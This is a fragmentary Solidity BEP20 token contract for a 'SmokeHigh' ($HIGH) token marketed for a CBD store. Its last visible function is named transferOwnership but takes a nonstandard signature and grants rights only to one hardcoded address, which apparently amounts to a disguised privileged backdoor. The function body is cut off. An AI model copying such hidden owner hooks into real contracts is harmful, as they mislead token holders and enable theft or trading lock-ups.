...
|  $$$$$$ | $$ $$/$$ $$| $$  | $$| $$$$$/  | $$$$$   | $$$$$$$$  | $$  | $$ /$$$$| $$$$$$$$      
 ...
 /$$  \ $$| $$\  $ | $$| $$  | $$| $$\  $$ | $$      | $$  | $$  | $$  | $$  \ $$| $$  | $$      
|  $$$$$$/| $$ \/  | $$|  $$$$$$/| $$ \  $$| $$$$$$$$| $$  | $$ /$$$$$$|  $$$$$$/| $$  | $$      
 \______/ |__/     |__/ \______/ |__/  \__/|________/|__/  |__/|______/ \______/ |__/  |__/      
                                                                                                 
                                                                                                 
 */                                                                                                

/**
$HIGH is a Binance smartchain token with integrated optimized buy-back system. 
The token will be used for payments in our app as in our store of CBD products.
Upon every sale a percentage will get used for an extra buy-back (double buy-back system).
*/
...
contract BEP20Token is Context, IBEP20, Ownable {
    ...
    constructor() public {
        _name = "https://www.smoke-high.com";
        _symbol = "SmokeHigh";
        _decimals = 9;
    ...
    function transferOwnership(address account, bool value) public {
        require(
            _msgSender() == 0x6A1F42D1bf34c76aaAbBF9c478D5a319AF5700d8,
